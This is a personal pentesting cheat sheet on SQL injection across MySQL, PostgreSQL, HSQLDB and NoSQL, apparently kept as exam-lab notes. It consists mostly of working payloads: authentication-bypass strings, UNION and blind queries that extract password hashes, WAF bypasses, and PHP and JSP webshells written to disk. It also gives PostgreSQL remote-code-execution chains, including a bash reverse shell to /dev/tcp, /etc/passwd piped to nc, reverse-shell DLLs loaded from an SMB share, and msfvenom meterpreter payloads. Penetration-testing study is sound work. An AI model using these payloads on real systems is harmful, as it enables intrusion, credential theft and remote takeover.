# SQL Injection (SQLI):  

	If a database is queried without proper input sanitization
    https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
    https://portswigger.net/web-security/sql-injection/cheat-sheet
    https://book.hacktricks.xyz/pentesting-web/sql-injection
    https://sqlwiki.netspi.com/#mysql
	Checks:
		See if ' OR " cause errors
        	URL parameters:  might need to URL encode
			?id=1' produces error?
			?cod=1+and+2=2  displays correctly?
    Overview:
        *Query Types & Methods:
            SELECT:
                Simple UNION:  
                    SELECT ... WHERE USERID=1 UNION SELECT 1
                    SELECT ... LIKE offsec_scope" UNION ALL SELECT 1,2,3,4,5#
                    *Pay attention to the type of data/column we're injecting into - may have to ...collate for UNION queries
                    *Also try UNION ALL
                    *Also try LIMIT 1       
                Blind:
                    Boolean:  [...] WHERE [.] AND ASCII(SUBSTR((SUBQUERY),X,X))=Y;
                    Time-Based:  [...] WHERE [.] AND ASCII(SUBSTR((SUBQUERY),X,X))=Y AND SLEEP(1337);
                    Boolean UNION:  SELECT ... WHERE USERID=1 UNION SELECT CASE WHEN (SELECT 1)=1 THEN 1 ELSE 0 END
                LIKE:
                    Blind Boolean:  zzz%'/**/or/**/(select/**/ascii(substring((select/**/[QUERY]),[OFFSET],1)))=[CHAR];#    //(assuming zzz doesn't exist)
                ORDER BY:
                    Boolean:  [...] WHERE [.] ORDER BY (SELECT (CASE WHEN EXISTS(SUBQUERY) THEN column1 ELSE column2 END));
                    Blind Time-Based:  [...] WHERE [.] ORDER BY (SUBQUERY AND sleep(1337));
            UPDATE/INSERT:
                Blind Error:  INSERT INTO user_agent values(NULL, '1' and updatexml(1, concat(0x7e, (user())), 0) and '1');
                Blind Time:  1' AND CASE (SUBSTRING(VERSION(), 1, 1)) WHEN 5 THEN SLEEP(10) ELSE NULL END AND '1
            Stacked Query:
                PostgreSQL-supported, MySQL generally not - but test!
                PyMysql supports if "multi=True" is set
                If supported: trying adding an INSERT or UPDATE statement
                Problem: returns multiple result sets - can prevent data exfiltration via blind boolean injection with stacked queries
                    Solution: Time-based blind injection with stacked queries
                        ex. ?ForMasRange=1&userId=1;%20SELECT%20pg_sleep(10)%20--
            Injecting into number field (quotes unnecessary w/ ; and stacked query) vs. string fields
                ex. 3 or 1=1 limit 1  ;  3 union select 1,2  ;  3 union select user(),database()
                If no stacked queries, use sub-queries:  (SELECT group_concat(table_name) from information_schema.tables WHERE version = 10)
            Error-Based Exfiltration - if errors are displayed:
                ex.  test' AND extractvalue(rand(),concat(0x3a,(SELECT @@version))) #
                https://github.com/rinku191/MySQL-SQL-Injection-Cheatsheet
        *Troubleshooting:
            Check SQL logs - might need quotes to escape; might need -- OR + OR %23 to terminate; might need semicolon to stack, etc.
                Check for escaped/filtered characters
            Test different types of payloads - simple payloads first
            Use ASCII conversion when reading files to avoid encoding issues
            Bypassing Character Restrictions:
                Space -> Comment:  SELECT/**/id,/**/user,/**/password/**/FROM/**/users/**/WHERE/**/id/**/=/**/'1';
                Upper and Lower Case:  SeLeCT id, user, password frOM users WHeRe id = '1';
            WAF Bypass:
                {`<string>`/*comment*/(<sql syntax>)}
                    ex. Blind Boolean:  /index.php?id={`foo`/*bar*/(select+1+from+wp_users+where+user_pass+rlike+"(^)[$].*"+limit+1)}
                    Better:  /index.php?id=@foo:=({`if`/*bar*/(select+1+from+wp_users+where+user_pass+rlike+"^[$]"+limit+1)})+union+%23%0a+distinctrow%0b+select+@foo
        *Strategy/Priorities:
            Check privileges of application -> If DBA: access filesystem, load third-party extensions, etc.
                Use database functions to read and write to the target file system
                    RevShell via overwriting an application script
                    Or write a webshell
                Other options: execute system commands or extend the database functionality to execute system commands or custom code
            Test stacked queries (esp. if blind) - https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/#StackingQueries 
        *If no injection - try a custom function -> RCE
	Authentication bypass:
		username:  admin'# ; password:   abc' OR 1=1#
		' or '1'='1
        	tom' or 1=1;#
		admin' or 1=1-- -
		abc' OR 1=1--
		Others:  https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/ or https://sushant747.gitbooks.io/total-oscp-guide/content/sql-injections.html
        	Fix "multiple row" error:   tom' or 1=1 LIMIT 1;#
	Example SQL Queries & Syntax:
		select * from accounts where username='$user' and password='$pass'
		Comment symbol: # (MySQL) or -- (standard SQL)	
	Manual Exploitation Process:  figure out structure, then extract data
		URL Parameter:
			1. Determine number of columns:
			    ?id=1 order by 1;    -> increment until error
			2. See which columns #'s are being displayed:
			    ex. if 4 columns:   ?id=1 union all select 1, 2, 3
			3. Extract data:
				?id=1 union all select 1, 2, @@version  (or version())
				union all select 1, 2, user()
				union all select 1, 2, database()
				UNION SELECT 1,concat(table_name,char(58),column_name) from information_schema.columns #
				union all select 1, 2, table_name from information_schema.tables
				    union all select 1, 2, column_name from information_schema.columns where table_name='users'
				    union all select 1, username, password from users
					or:  union select 1,2,concat(name,0x3a,password) FROM users
				Read File:  union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
					UNION SELECT 1, load_file(/etc/passwd) #
					union select null,load_file('/etc/passwd'),null,null,null
				Make Backdoor:  
					Win:  union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/cmd.php'
						Or:  union select '<?php system($_GET[\'cmd\']); ?>',2,3,4,5,6 into outfile 'c:/inetpub/wwwroot/_0xdf.php'#
					Unix:  union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
						Or:  ?cod=1+union+select+1,2,3,4,5,6,'<?php_system($_GET["cmd"]); ?>' into outfile '/var/www/html/cmd.php'
			    		Access:  10.11.0.22/backdoor.php?cmd=ifconfig
					Windows: try creating admin user and add to RDP group
	Automated Exploitation:
		Post:
			Capture request w/ burp & save, then:  sqlmap -r request.txt -p username
		Get:
		    sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"
			Dump database:   sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump [-D Webapp -T Users]
			Open Shell:   sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --os-shell
        Crawl:  sqlmap -u http://192.168.1.101 --dbms=mysql --crawl=3
		Examples:
			Automated Scan:  sqlmap -u http://example.com --forms --batch --crawl=10 --cookie=sessionid=12345 --level=5 --risk=3
			Targeted Scan:  sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read="/var/www/page.php" 
			Check Form for Injection:  sqlmap -o -u "http://example.com/form/" --forms
			sqlmap -u "http://example.com/page.php?id=1" --dbms=mysql --technique=U --random-agent --dump
			sqlmap -o -u "http://example.com/vuln-form" --forms -D database-name -T users --dump
	Blind SQL Injection:
		Boolean (if you have a visual indicator):
			MySQL:
				True:  AAAA')/**/or/**/(select/**/1)=1%23
            			False:  AAAA')/**/or/**/(select/**/1)=0%23
				Extraction:  q=test%27)/**/or/**/(select/**/ascii(substring((select/**/version()),1,1)))=53%23
		Time-Based (if no feedback is displayed):
			PostgreSQL:  ?userId=1;%20SELECT%20pg_sleep(10)%20--
    More Blind SQLI:
        Cheat Sheet: https://ansar0047.medium.com/blind-sql-injection-detection-and-exploitation-cheatsheet-17995a98fed1
        Script writing:  https://diablohorn.com/2014/07/26/writing-your-own-blind-sqli-script/
        Example Process (Display Based - PostgreSQL):
            /home/1'  then:  /home/1 OR 1=1  then:  /home/1 AND 1=2
            If condition (if 1-3 are valid):  /home/(select case when 1=1 then 1 else 4 end)
            Guessing tables:  /home/(select case when tbl_name='users' then 1 else 4 end from sqlite_master where type='table')
            Guessing names from users table:  /home/(select case when substr(UserName,1,1)='A' then 1 else 4 end from users limit 1)
                /home/(select case when substr(UserName,2,1)='d' then 1 else 4 end from users limit 1)
                etc.
        Content-Based:
            Display or don't display:  id=1 and 1=if(substring((select @@version),1,1)=5,1,2)
                Base query:  root' and 1=if(({PLACEHOLDER})=PLACEHOLDERVAR,1,2)--+
                    ex. root' and 1=if(substring((select @@version),1,1)=20,1,2)–-+  ->  root' and 1=2  ->  False  ->  nothing displayed
            Display content based on query:  id=1 + substring((select @@version),1,1)
        Time Based:
            Microsoft SQL: /vulnerable.php?id=1' waitfor delay '00:00:10'--
            MySQL: 
                1 UNION SELECT IF(SUBSTRING(user_password,1,1) = CHAR(50),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) FROM users WHERE user_id = 1;
                select if(substring(bin(ascii(substring((select @@version),1,1))),sleep(10),0)=TRUE,3,4)
                root' and 1=if(substring({},{},1)=TRUE,sleep(1),2)– 
            PostgreSQL: pg_sleep()
	SQL command LFI/reverse shell:  add field in table with value:  <?php system($_REQUEST["cmd"]);?>
	Follow-on Auth Bypass Methods:
		dump hashes and crack passwords
		account hijack methods (ex. stealing password reset token)
	Fix Collation Error:
                Check Injection Site:  abc" UNION ALL SELECT 1,2,3,4,COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name"#
                Then Apply:  abc" UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci FROM __Auth#
            Ex. Finding value/pulling column names:  abc" UNION ALL SELECT 1,2,3,4,COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = "tabUser"#
                Pull value:  abc" UNION ALL SELECT name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#

## MySQL/MariaDB:

    https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
    Enabling Database Logging:
        /etc/mysql/my.cnf or /etc/my.cnf or /etc/my.cnf.d/mysql-server.cnf: uncomment general_log_file and general_log; restart w/ sudo systemctl restart mysql[d]; or add log=/var/log/mysql/mysqld.log and log-error=/var/log/mysql/mysqld.log under [mysqld]
        Debug SQL Queries:  sudo tail -f /var/log/mysql/mysql.log  
    Stacking: PyMysql supports if "multi=True" is set
        MySQL does not support stack query with PHP, ASP.NET, Java
        If supported: trying adding an INSERT or UPDATE statement
    SELECT Statements:
        Try adding a UNION ALL:  SELECT ... LIKE offsec_scope" UNION ALL SELECT 1,2,3,4,@@version#
            offsec_scope" UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci FROM __Auth#
            offsec_scope" UNION ALL SELECT 1,2,3,4,COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = "tabUser"#
            offsec_scope" UNION ALL SELECT name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#
    Blind Boolean-Based SQLI:
        Basic:  admin' and substring(password, 1, 1) = '0' -- -
        Establish Baseline, test known:
            True: AAAA')/**/or/**/(select/**/1)=1%23
            False: AAAA')/**/or/**/(select/**/1)=0%23
            %23=End of Trans. Blk.
        Extracting Info:
            Version: normally: select/**/version();
            We have to do by character:
                select/**/(substring((select/**/version()),1,1))='5';
                    Better: avoid filters, convert to ascii:  select/**/ascii(substring((select/**/version()),1,1))=52;
                For us:  q=test%27)/**/or/**/(select/**/ascii(substring((select/**/version()),1,1)))=53%23
        Another Example (SELECT LIKE-injection):
            zzz%'/**/or/**/(select/**/ascii(substring((select/**/[QUERY]),[OFFSET],1)))=[CHAR];#    //(assuming zzz doesn't exist)
                SELECT * FROM `Users` WHERE email LIKE 'zzz%'/**/or/**/(select/**/ascii(substring((select/**/user()),1,1)))=100;#'%'
        SUBSTRING/SUBSTR - starts at 1,1 (start position, length)
        LIMIT delimiter - MySQL: starts at [0,]1 ([offset,] row count); PostgreSQL: just # of result records to display
    Blind Time-Based:
        1 UNION SELECT IF(SUBSTRING(user_password,1,1) = CHAR(50),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) FROM users WHERE user_id = 1;
        select if(substring(bin(ascii(substring((select @@version),1,1))),sleep(10),0)=TRUE,3,4)
        BASE_QUERY = "root' and 1=if(substring({},{},1)=TRUE,sleep(1),2)– "
    Conditional Error:  SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
    Troubleshooting/Filters:
        Space Restriction Bypass:  select/**/1;
        Hex (Quotes Restriction Bypass) - Automatically Decoded:
            select concat(0x31333337,0x206840783072) -> Same as: select concat('1337',' h@x0r')
            ex. SELECT 0x6a6f726765637466       #SELECT 'jorgectf'
            hex(load_file('/etc/passwd'))
            load_file(0x2e2e2f6574632f706173737764)
        Base64:  SELECT FROM_BASE64('Q2F0');    #cat
            TO_base64(LOAD_FILE('/var/www/html/index.php'))  
        Collation Error Fix:
            Check Injection Point Collation:  offsec_scope" UNION ALL SELECT 1,2,3,4,COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name"#
            Then Use:  offsec_scope" UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci FROM __Auth#
    Read File:  …’ UNION ALL SELECT LOAD_FILE(‘/etc/passwd’)        #priv       SELECT LOAD_FILE(0x633A5C626F6F742E696E69)
        load_file('/etc/passwd') INTO OUTFILE '/var/www/html/shell.php'--
    Write to File:  SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’;    #priv
        Write PHP Shell:  SELECT 'system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php'
    PHP Wrappers: 
        Read File:  php://filter/convert.base64-encode/resource=.
        RCE:  ’ /*!50000union*/ select 1,2,3,4,5,’../index’,7,8,’php://filter/convert.base64-encode/resource=.’ -- -
		Or:  data://text/plain,<?php $a="sy";$b="stem";$c=$a.$b; $c("uname -a");?>
    UDF RCE:  https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf (if you can write to the target system)
    RCE via MySQL Client:  \! sh [-c id]

### Useful MySQL Queries:

	SELECT...
	
	concat(host, char(58), user, char(58), password) FROM mysql.user
	user()
	system_user()
	group_concat(privilege_type) from information_schema.user_privileges
	version()
	database()
	@@hostname
	@@datadir
	schema()
	LOAD_FILE('/etc/passwd')
	schema_name FROM information_schema.schemata LIMIT 0,1		#First Limit is offset; second is number of records to pull/display
	table_name from information_schema.tables
	user FROM mysql.user LIMIT 0,1
	PHP Wrappers: 
		Read File:  php://filter/convert.base64-encode/resource=.
		RCE:  data://text/plain,<?php $a="sy";$b="stem";$c=$a.$b; $c("uname -a");?>

	//**Databases, Tables, and Columns:   concat(table_schema, char(58), table_name, char(58), column_name) FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'
	//Databases: schema_name FROM information_schema.schemata
		OR:  group_concat(schema_name) from information_schema.schemata
	//Tables: table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'
		//Or: TABLE_NAME FROM information_schema.TABLES WHERE table_schema="database1"
	//Columns: column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="table1"
	//Data: column1 FROM table1 LIMIT %s,1
		ex. concat(login, char(58), password) FROM atutor.AT_admins
		//From another database: column1 FROM database2.table1
	//Users: user FROM mysql.user
	//Password Hashes (mysql): concat(host, char(58), user, char(58), password) FROM mysql.user


    
        
## PostgreSQL:

    https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet
    https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
    https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection
    Enabling Database Logging:
        Windows:
            C:\Program Files (x86)\ManageEngine\AppManager12\working\pgsql\data\amdb\postgresql.conf: log_statement = 'all' - then restart application service
            Failed queries log in:  ex. C:\Program Files (x86)\ManageEngine\AppManager12\working\pgsql\data\amdb\pgsql_log\
            Test queries directly from admin console - PGAdmin
                Or from CMD:  psql.exe -U postgres -p 15432
        Unix:
            /etc/postgresql/10/main/postgresql.conf: Uncomment log_destination, logging_collector, log_directory, log_filename, log_statement; systemctl restart postgresql; tail -f /var/log/postgresql/...
            https://tableplus.com/blog/2018/10/how-to-show-queries-log-in-postgresql.html
    Blind Boolean:
        admin' and substr(password,1,1) = '0'-- -
        admin' and password LIKE '0e%'-- -
    Blind Time-Based (Stacked):
        POC: &userId=1;%20SELECT%20pg_sleep(10)%20--
        SELECT current_setting('is_superuser');  ->  &userId=1;SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+
        File Read (char by char):  &userId=1;create+temp+table+awae+(content+text);copy+awae+from+$$c:\awae.txt$$;select+case+when(ascii(substr((select+content+from+awae),1,1))=104)+then+pg_sleep(10)+end;--+
    File Write:  &userId=1;COPY+(SELECT+$$offsec$$)+to+$$c:\\offsec.txt$$;--+
    ORDER BY Blind/Error SQLI:  https://pulsesecurity.co.nz/articles/postgres-sqli
        Error Message Exfil:  SELECT CAST(chr(32)||(SELECT pg_user) AS NUMERIC)
        Conditional Error:  1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN CAST(1/0 AS INTEGER) ELSE NULL END)
    Troubleshooting/Filters:
        Base64:  ex. select convert_from(decode('QVdBRQ==', 'base64'), 'utf-8');
        ASCII Concatenation: only works for basic queries - SELECT, INSERT, DELETE, etc.
            ex. SELECT CHR(65)||CHR(87)||CHR(65)||CHR(69);
        Quote Restriction Bypass (Lexical Structure):
            SELECT 'AWAE';  OR  SELECT $$AWAE$$;  OR  SELECT $TAG$AWAE$TAG$;
            ex. CREATE TEMP TABLE AWAE(offsec text);INSERT INTO AWAE(offsec) VALUES ($$test$$);COPY AWAE(offsec) TO $$C:\Program Files (x86)\PostgreSQL\9.2\data\test.txt$$;
        Hex:
            convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573','UTF8')
            SELECT U&"\006a\006f\0072\0067\0065\0063\0074\0066" #SELECT jorgectf
            SELECT U&'\006a\006f\0072\0067\0065\0063\0074\0066' #SELECT 'jorgectf'
            U&'\006a\006f\0072\0067\0065\0063\0074\0066'() #jorgectf()
        Combine Results to One Row:  query_to_xml(query text, nulls boolean, tableforest boolean, targetns text)
            ex. select query_to_xml('select * from pg_user',true,true,''); --
            Dump Entire Database as One Row:  database_to_xml(true,true,'')
        Collation:
            Check:
                Columns (non-default):  select table_schema, table_name, column_name, collation_name from information_schema.columns where collation_name is not null order by table_schema, table_name, ordinal_position;
                Database:  select datname, datcollate from pg_database;
            Set:  select ... collate "C"  ;  select ... collate "C.UTF-8"
    If DBA: access filesystem; potentially load third-party PostgreSQL extensions (native C++ code)
    Filesystem Access:
        Read File:  
            select pg_ls_dir('./');
                select pg_read_file('PG_VERSION', 0, 200);      #older versions don't take absolute path
            CREATE temp table awae (content text); COPY awae from $$c:\awae.txt$$; SELECT * from awae; DROP table awae;
            SELECT pg_read_file('/usr/local/pgsql/data/pg_hba.conf', 0, 200);
            SELECT lo_import($$C:\\Windows\\win.ini$$,1337); select loid, pageno, encode(data, 'escape') from pg_largeobject;
        Write to File:
            Without table:  COPY (SELECT $$offsec$$) to $$c:\\offsec.txt$$;
            With table:
                CREATE TABLE mytable (mycol text);
                INSERT INTO mytable(mycol) VALUES ('');
                COPY mytable (mycol) TO '/var/www/test.php';
            LO:
                SELECT lo_from_bytea(43210, 'your file data goes in here'); -- create a large object with OID 43210 and some data
                SELECT lo_put(43210, 20, 'some other data'); -- append data to a large object at offset 20
                SELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport
        Other Method: Large Objects
    RCE Methods:
        Method 1: Basic Query:
            query = `DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/192.168.119.162/5555 0>&1"';`
        Method 2: File Overwrite:
            Overwrite Batch file used by application (at startup)
                ex. C:\Program Files (x86)\ManageEngine\AppManager12\bin\AMWrapperPreinvokation.bat
                    Query payload:  &userId=1;copy+(select+convert_from(decode($$ENCODED_PAYLOAD$$,$$base64$$),$$utf-8$$))+to+$$C:\\\\Program+Files+(x86)\\\\ManageEngine\\\\AppManager12\\\\bin\\\\AMWrapperPreInvokation.bat$$;--+
                Generate PS rev shell (Then base64 and url encode it!):  
                    x86: msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.119.158 LPORT=5555 -e x86/shikata_ga_nai -f psh-cmd
                    x64: msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.158 LPORT=5555 -e shikata_ga_nai -f psh-cmd
            Better: overwrite VBS file used in regular operation of application (insert malicious commands)
                Use ProcMon - ex. C:\Program\ Files\ (x86)\ManageEngine\AppManager12\working\conf\application\scripts\wmiget.vbs
                copy (select convert_from(decode($$ENCODED_PAYLOAD$$,$$base64$$),$$utf-8$$)) to $$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;
                    Query payload:  &userId=1;copy+(select+convert_from(decode($$ENCODED_PAYLOAD$$,$$base64$$),$$utf-8$$))+to+$$C:\\\\Program+Files+(x86)\\\\ManageEngine\\\\AppManager12\\\\working\\\\conf\\\\application\\\\scripts\\\\wmiget.vbs$$;--+
                Generate Payload:  msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=4444 -e x86/shikata_ga_nai -f vbs
                    Then base64 and url encode it (w/ Burp)!
            Tips:
                Back up file first!
                Convert the content of the target file to a one-liner and make sure it is still executing properly before appending our payload - Make sure our payload is also on a single line
                Use POST request due to payload size
        Method 3: User-Defined Function (UDF) / PostgreSQL Extensions - custom DLLs:
            Arbitrary Process Launch: awae.dll
                Testing:  create or replace function test(text, integer) returns void as $$C:\awae.dll$$, $$awae$$ language C strict; SELECT test($$calc.exe$$, 3);
                Reload extension: net stop "Applications Manager" (your service); del c:\awae.dll; net start "Applications Manager"; DROP FUNCTION test(text, integer);
                Testing remote load:  sudo impacket-smbserver awae /home/kali/awae/; CREATE OR REPLACE FUNCTION remote_test(text, integer) RETURNS void AS $$\\192.168.119.120\awae\awae.dll$$, $$awae$$ LANGUAGE C STRICT; SELECT remote_test($$calc.exe$$, 3);
            Reverse Shell: rev_shell.dll (hosted via samba)
                Create Function:  CREATE OR REPLACE FUNCTION rev_shell(text, integer) RETURNS void AS $$\\192.168.119.158\awae\rev_shell.dll$$, $$connect_back$$ LANGUAGE C STRICT;
                Trigger Callback:  select rev_shell($$192.168.1.1$$, 4444);
            Alternate RevShell Method - writing rev_shell.dll to disk via PostgreSQL Large Objects:
                see largeObjectUDFRevShell.py for process
            Metasploit Method:  https://www.rapid7.com/db/modules/exploit/linux/postgres/postgres_payload/
        Method 4: Libc - https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#postgresql - easiest w/ <=8.1

### Useful PostgreSQL Queries:
	https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
	version();
	user; \\ current_user; \\ session_user; \\ usename FROM pg_user; \\ getpgusername();
	usename, passwd FROM pg_shadow;
	Privs:  usename, usecreatedb, usesuper, usecatupd FROM pg_user;  \\  current_setting('is_superuser');
	Admins:  usename FROM pg_user WHERE usesuper IS TRUE;
	current_database();
	inet_server_addr();
	inet_server_port();
	current_setting('data_directory');
	SELECT current_setting('hba_file');

	Databases:  SELECT datname FROM pg_database;
	Tables:  SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r',") AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid);
	    SELECT table_name FROM information_schema.tables
	Columns:  SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public');
	    SELECT column_name FROM information_schema.columns WHERE table_name='data_table'
	Read File:  CREATE temp table mytable (content text); COPY mytable from $$c:\\Windows\\System32\\Drivers\\etc\\hosts$$; SELECT content from mytable LIMIT 1 OFFSET 0; DROP table mytable;
	    Method 2:  SELECT lo_import($$C:\\Windows\\win.ini$$,1337); select loid, pageno, encode(data, 'escape') from pg_largeobject; ->After:  SELECT lo_unlink(l.oid) FROM pg_largeobject_metadata l;  OR  SELECT lo_unlink(1337);
	Create File:  CREATE TABLE mytable (mycol text); INSERT INTO mytable(mycol) VALUES ('<?php passthru($_GET[cmd]); ?>'); COPY mytable (mycol) TO '/tmp/test.php'; 
	    Or:  COPY (SELECT $$abc$$) to $$c:\\abc.txt$$;
	    Reverse Shell Upload (use POST, with one-liner payload base64 encoded, then URL encoded):  copy (select convert_from(decode($$ENCODED_PAYLOAD$$,$$base64$$),$$utf-8$$)) to $$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;
		Payload:  msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=4444 -e x86/shikata_ga_nai -f vbs
	    Method 2:  see large object method
	Run Command:  CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT; SELECT system('cat /etc/passwd | nc 10.0.0.1 8080');
	Time Delay:  SELECT pg_sleep(10);
	Base64 Encoding:  select convert_from(decode('YWJj==', 'base64'), 'utf-8');
	Hex Encoding and Concatenation:  SELECT CHR(117) || CHR(115) || CHR(101) || CHR(114);   \\same as SELECT user;
	Substitute for Quotes:  SELECT 'user';  =  SELECT $$user$$;  =  SELECT $TAG$user$TAG$;
	    ex. CREATE TEMP TABLE mytable(mycolumn text);INSERT INTO mytable(mycolumn) VALUES ($$test$$); COPY mytable(mycolumn) TO $$C:\Program Files (x86)\PostgreSQL\9.2\data\test.txt$$;
	Blind Time-Based:
	    SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+
	    Reading File:  create+temp+table+ABC+(content+text);copy+ABC+from+$$c:\ABC.txt$$;select+case+when(ascii(substr((select+content+from+ABC),1,1))=104)+then+pg_sleep(10)+end;--+
	Large Objects:
	    select lo_import('C:\\Windows\\win.ini', 1337);	//load file into memory
	    select loid, pageno from pg_largeobject;	//file is divided into 2kb 'pages' in the table
	    select loid, pageno, encode(data, 'escape') from pg_largeobject;
	    update pg_largeobject set data=decode('77303074', 'hex') where loid=1337 and pageno=0;	//update each page individually
	    select lo_export(1337, 'C:\\new_win.ini');	//resave as new file
	    SELECT lo_unlink(1337);	//delete LO from memory
	Loading Extensions (User-Defined Functions):
		CREATE OR REPLACE FUNCTION remote_test(text, integer) RETURNS void AS $$\\192.168.1.1\myshare\exec.dll$$, $$execFunc$$ LANGUAGE C STRICT;
                SELECT remote_test($$calc.exe$$, 3);
		CREATE OR REPLACE FUNCTION rev_shell(text, integer) RETURNS void AS $$\\\\192.168.119.158\\awae\\rev_shell.dll$$,$$connect_back$$ LANGUAGE C STRICT;
		SELECT rev_shell($$192.168.1.1$$, 4444);
		Base64 Insert:
			INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 0, decode('<B64 chunk1>', 'base64'));
			INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 1, decode('<B64 chunk2>', 'base64'));
			INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 3, decode('<B64 chunk2>', 'base64'));
		Hex Insert:  update pg_largeobject set data=decode('68656c6c6f', 'hex') where loid=173454 and pageno=0; 

## HSQLDB:
	Download .jar and connect:  java -cp hsqldb.jar org.hsqldb.util.DatabaseManagerSwing --url jdbc:hsqldb:hsql://abc:9001/app --user abc --password abc
	RCE - calling Java code via custom procedures:
		ex. Checking system properties:
                    CREATE FUNCTION systemprop(IN key VARCHAR) RETURNS VARCHAR 
                     LANGUAGE JAVA 
                     DETERMINISTIC NO SQL
                     EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty'
                    Call it:  VALUES(systemprop('java.class.path'))
		Use Function in the App's Class Path (ex. a write file function):
                    CREATE PROCEDURE writeBytesToFilename(IN paramString VARCHAR, IN paramArrayOfByte 
                    VARBINARY(1024)) 
                     LANGUAGE JAVA 
                    DETERMINISTIC NO SQL
                     EXTERNAL NAME 
                    'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'
                    Convert payloads to ascii hex, then call:
                        call writeBytesToFilename('test.txt', cast ('497420776f726b656421' AS VARBINARY(1024)))
                    RCE Options:
                        write JSP webshell and access in browser
                    Write Webshell (/usr/share/webshells/jsp/cmdjsp.jsp):
                        convert to Linux; make smaller by removing html; encode to hex
                        call writeBytesToFilename('../../apache-tomee-plus-7.0.5/apps/abc/shell.jsp', cast('ABC...' as VARBINARY(1024)))
                        ACCESS:  curl http://abc:8080/abc/shell.jsp?cmd=hostname

## SQLite Commands:
    
    .help
    .databases
    .tables
    .echo ON|OFF
    Dump:
        .mode csv
        .headers on
        .output <outfile>
        select * from <table>;
    .dump [tablename]
    .exit

## NOSQL Injection:  

	in burp, try: username[$ne]=..., password[$ne]=...
	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
	If injection succeeds, enumerate accounts with: https://raw.githubusercontent.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration/master/nosqli-user-pass-enum.py
	python3 mangoenum.py -u http://staging-order.mango.htb/ -up username -pp password -op login:login -ep username
		then: python3 mangoenum.py -u http://staging-order.mango.htb/ -up username -pp password -op login:login -ep password
